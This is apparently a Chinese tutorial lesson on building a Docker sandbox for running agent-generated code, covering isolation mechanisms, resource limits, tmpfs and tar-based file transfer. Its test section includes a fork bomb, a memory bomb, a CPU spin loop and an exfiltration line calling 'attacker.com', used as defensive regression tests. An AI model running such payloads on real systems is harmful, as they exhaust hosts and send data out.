## Docker 沙箱实战：安全隔离、资源限制、文件系统

L09-01 得出结论：Docker 沙箱是生产级代码执行的主力方案。这一节动手搭一个——用 Docker SDK 起隔离容器、配资源限制、做临时文件系统。搭完你会理解每个"安全旋钮"在防什么，而不只是抄配置。

先用交互面板感受「攻击码 → 哪一层防线拦住」，再动手实现：

::interactive{type="sandboxDemo"}

### 先理解 Docker 隔离的三个支柱

Docker 不是魔法"安全盒子"，它的隔离由三个 Linux 机制支撑，得知道各自防什么：

```
┌──────── Docker 容器 ────────────────────────────┐
│                                                  │
│  1. namespace（命名空间）→ 隔离"看得见什么"       │
│     · PID：容器只看到自己的进程                   │
│     · NET：容器有独立网络栈                       │
│     · MNT：容器有独立文件系统挂载视图             │
│     · UTS/IPC/USER...：各自的隔离维度             │
│                                                  │
│  2. cgroup（控制组）→ 限制"能用多少"              │
│     · CPU 配额：吃不掉宿主机的算力                │
│     · 内存上限：爆不掉宿主机内存                   │
│     · 磁盘 IO：限速                              │
│                                                  │
│  3. capabilities / seccomp → 限制"能干什么"       │
│     · 删掉 root 的危险能力（挂载、改网络...）     │
│     · 过滤危险系统调用（seccomp 黑名单）          │
│                                                  │
└──────────────────────────────────────────────────┘
```

**记忆要点**：namespace 管"可见性"，cgroup 管"额度"，capabilities/seccomp 管"权限"。三者叠加才形成容器隔离，缺一个都有逃逸风险。

### 用 Docker SDK 起一个沙箱容器

`docker` SDK（`pip install docker`）用 Python 控制容器。最小可用沙箱：

```python
import docker
import tarfile, io, time, uuid

client = docker.from_env()

SANDBOX_IMAGE = "python:3.12-slim"   # 官方精简镜像，预装 Python

def run_sandboxed(code: str, timeout: int = 10) -> dict:
    """在 Docker 沙箱里执行代码，返回 stdout/stderr/退出码"""
    # 1. 创建容器，叠加一堆安全限制
    container = client.containers.create(
        image=SANDBOX_IMAGE,
        command=["python", "-c", code],   # 直接跑传入的代码
        detach=True,
        # —— 隔离与限制旋钮 ——
        network_mode="none",              # 断网：容器无网络
        mem_limit="256m",                 # 内存上限 256MB
        memswap_limit="256m",             # 禁止 swap 换出（防用 swap 绕过内存限制）
        cpu_quota=50000,                  # CPU 配额：50% 单核（100000=1 核）
        pids_limit=50,                    # 进程数上限（防 fork 炸弹）
        user="nobody",                    # 非 root 运行
        read_only=True,                   # 根文件系统只读
        tmpfs={"/tmp": "size=10m,mode=1777"},  # 临时文件系统，10MB，容器停就消失
        # 磁盘配额：部分存储驱动支持 storage_opt；通用做法是靠 tmpfs size 限制可写空间
        # storage_opt={"size": "100m"},  # overlay size 限制（视 Docker/存储驱动而定）
        security_opt=["no-new-privileges", "seccomp=default"],  # 禁提权 + 默认 seccomp
        cap_drop=["ALL"],                 # 删除所有 Linux capabilities
        working_dir="/tmp",
    )
    try:
        container.start()
        # 2. 等待执行完成（带超时）
        result = container.wait(timeout=timeout)
        exit_code = result["StatusCode"]
        # 3. 收集输出
        stdout = container.logs(stdout=True, stderr=False).decode()
        stderr = container.logs(stdout=False, stderr=True).decode()
        return {"exit_code": exit_code, "stdout": stdout, "stderr": stderr}
    except Exception as e:
        # 超时或异常，强制终止
        container.kill()
        return {"exit_code": -1, "stdout": "", "stderr": f"执行失败: {e}"}
    finally:
        # 4. 无论成败，立即删除容器（不留痕迹）
        container.remove(force=True)
```

**每个旋钮在防什么**——这是这节的核心，逐个说清：

### 旋钮详解：隔离与限制

| 旋钮 | 作用 | 不设的风险 |
|------|------|-----------|
| `network_mode="none"` | 容器无网络 | 代码外连下载恶意脚本、泄露数据 |
| `mem_limit="256m"` | 内存上限 | 死循环分配爆掉宿主机 |
| `memswap_limit=mem_limit` | 禁 swap | 内存到顶后用 swap 绕过限制继续吃磁盘 |
| `cpu_quota` | CPU 配额 | 死循环把宿主机 CPU 跑满，拖垮其他服务 |
| `pids_limit=50` | 进程数上限 | fork 炸弹（`while True: os.fork()`）打垮系统 |
| `user="nobody"` | 非 root | root 在容器内权限大，逃逸概率高 |
| `read_only=True` | 根目录只读 | 往系统目录写后门、篡改库文件 |
| `tmpfs` /tmp | 临时可写区 | 没它代码连临时文件都写不了（只读了根），给了又自动清理 |
| `cap_drop=["ALL"]` | 删所有能力 | 默认容器有部分 root 能力（如改网络），删光最安全 |
| `no-new-privileges` | 禁提权 | 子进程通过 setuid 提权到 root |

**最常见的疏漏**：只设 `mem_limit` 不设 `memswap_limit`——Docker 默认允许 swap 等于 2 倍内存，于是 256m 的限制实际是 768m，内存攻击照样能打爆磁盘。**两者设成一样大，等于禁掉 swap 绕过**。

### 资源限制实战：让"恶意代码"打不垮

用上面那个沙箱跑几段"攻击性"代码，验证限制生效：

```python
# 攻击1：内存炸弹（分配大数组）
malicious_mem = "x = 'A' * (10**9)"  # 想要 1GB
r = run_sandboxed(malicious_mem)
# exit_code = 137（OOM Killed），容器被杀，宿主机无恙

# 攻击2：fork 炸弹（无限派生进程）
fork_bomb = "import os\nwhile True: os.fork()"
r = run_sandboxed(fork_bomb, timeout=5)
# pids_limit=50 生效，很快到 50 进程上限，新 fork 失败，不波及宿主

# 攻击3：死循环烧 CPU
cpu_spin = "while True: pass"
r = run_sandboxed(cpu_spin, timeout=5)
# cpu_quota 限制到 50% 核，宿主其他服务不受影响；超时被 kill

# 攻击4：尝试外连
exfil = "import urllib.request\nurllib.request.urlopen('http://attacker.com')"
r = run_sandboxed(exfil)
# network_mode=none，直接连不通，数据出不去

# 正常代码
normal = "print(sum(range(100)))"
r = run_sandboxed(normal)
# exit_code=0, stdout="4950\n"
```

**测试意义**：每跑一个攻击向量，都是在验证"某个旋钮确实生效"。生产前把这套攻击向量跑一遍当回归测试，谁动了配置立刻暴露。

### 临时文件系统：执行后自动清理

`read_only=True` 让根目录只读，但很多代码要写临时文件（pandas 缓存、模型下载）。`tmpfs` 提供一个**内存里的临时可写区**，容器一停就消失：

```
容器文件系统视图：
  /         ← read_only=True，只读（系统库在这）
  /tmp      ← tmpfs，可写，10MB 上限，容器停止即销毁
  /home     ← 只读（无人写入）

执行后：
  容器 remove(force=True) → /tmp 数据全清 → 宿主机无残留
```

**为什么不用 volume 持久化**：代码执行沙箱的原则是"用完即弃"。持久化 volume 意味着上一次执行的残留文件可能被下次读到——既可能泄露，也可能造成状态污染。`tmpfs` + `remove` 保证每次执行都是干净环境。

### 文件传入传出：用 tar 管道

Agent 经常要"给沙箱一个数据文件，跑完拿回结果"。容器只读根目录，不能直接写文件——用 `put_archive` 把数据以 tar 流塞进 `/tmp`：

```python
def run_with_file(code: str, input_files: dict, timeout=10) -> dict:
    """传文件进沙箱执行。input_files: {文件名: 内容bytes}
    关键：必须先 start（tmpfs 挂载后）再 put_archive，否则写入会被 tmpfs 覆盖。
    """
    container = client.containers.create(
        image=SANDBOX_IMAGE,
        command=["sleep", "infinity"],  # 占位，避免 start 时抢跑 /tmp/main.py
        detach=True, network_mode="none", mem_limit="256m", memswap_limit="256m",
        cpu_quota=50000, pids_limit=50, user="nobody", read_only=True,
        tmpfs={"/tmp": "size=50m,mode=1777"},
        security_opt=["no-new-privileges", "seccomp=default"],
        cap_drop=["ALL"], working_dir="/tmp",
    )
    try:
        container.start()  # 先挂载 tmpfs
        tar_stream = io.BytesIO()
        with tarfile.open(fileobj=tar_stream, mode="w") as tar:
            tar.addfile(*_make_tar_member("main.py", code.encode()))
            for name, content in input_files.items():
                tar.addfile(*_make_tar_member(name, content))
        tar_stream.seek(0)
        container.put_archive("/tmp", tar_stream)

        exec_result = container.exec_run(
            ["python", "/tmp/main.py"], demux=True,
        )
        out, err = exec_result.output if isinstance(exec_result.output, tuple) else (exec_result.output, b"")
        return {
            "exit_code": exec_result.exit_code,
            "stdout": (out or b"").decode(errors="replace"),
            "stderr": (err or b"").decode(errors="replace"),
        }
    finally:
        container.remove(force=True)

import tarfile, time
def _make_tar_member(name: str, content: bytes):
    info = tarfile.TarInfo(name=name)
    info.size = len(content)
    info.mtime = int(time.time())
    info.mode = 0o644
    return info, io.BytesIO(content)
```

**关键**：数据经 tar 进容器、容器停即销毁，宿主机全程不留中间文件。这是"无状态沙箱"的正确做法。

### 镜像选择：越小越安全

```python
# ❌ 不好：用全家桶镜像
image = "python:3.12"            # 几百 MB，装了一堆工具（gcc、curl...），攻击面大

# ✅ 好：用精简镜像
image = "python:3.12-slim"       # ~50MB，只够跑 Python
image = "python:3.12-alpine"    # 更小，但 wheels 兼容性差
```

**安全原则**：镜像越小，预装的攻击工具越少。`slim` 里没有 `curl`、`gcc`，即便代码想外连编译，也没工具可用。最小权限原则在镜像层面同样适用。

### 容器编排的现实开销

每个请求起一个容器，秒级启动延迟可能拖垮体验。生产优化：

```
朴素模式：每请求 create+start+wait+remove
  延迟：~1-3s/次（容器启动开销）
  适合：低频、长任务

优化1：预热池（warm pool）
  预先起 N 个就绪容器，请求来直接 exec
  延迟：~50-200ms
  代价：常驻内存

优化2：复用容器（同会话多次执行）
  一个 Agent 会话内复用同一容器，保留状态
  风险：状态污染、隔离弱化，需定期回收
```

> 多数场景用**预热池**就够。`docker exec` 复用容器要谨慎——它破坏了"用完即弃"的无状态假设，只在明确需要跨步保留状态（如交互式数据分析）时用，且要设回收周期。

### 何时该放弃 Docker 上云端

Docker 沙箱的软肋：**和宿主机共享内核**。遇到这些情况，该上 VM 级隔离（L09-03）：

- 执行**完全不可信**的代码（用户上传的任意脚本，非 Agent 生成）
- 合规要求"硬件级隔离"（金融、医疗）
- 单机内核版本老、已知容器逃逸漏洞未修

> Agent 生成的代码通常是"半可信"的（你能看 prompt、能加审查），Docker 够用。但如果做的是"用户上传代码执行平台"，威胁模型变了，得上 VM。下一节讲云端方案。

### 要点总结

- Docker 隔离三支柱：namespace（可见性）+ cgroup（额度）+ capabilities/seccomp（权限）
- 沙箱旋钮各自防一类攻击：断网防外连、mem/cpu/pids 限资源、非root+只读+cap_drop 防逃逸
- 最常见疏漏：只设 mem_limit 不设 memswap_limit，swap 绕过内存限制——两者设等大
- 用攻击向量（OOM/fork/死循环/外连）做回归测试，验证每个旋钮生效
- 临时文件系统用 tmpfs + remove：保证每次执行干净、宿主无残留
- 数据传入用 tar 流（put_archive），不用 volume 持久化——避免状态污染和泄露
- 镜像越小越安全：python:slim 比 python 全量攻击面小得多
- 启动开销优化：预热池（生产常用）> 每请求新建；docker exec 复用要防状态污染
- Docker 共享内核是软肋：执行完全不可信代码/强合规场景，升级到 L09-03 云端 VM 沙箱
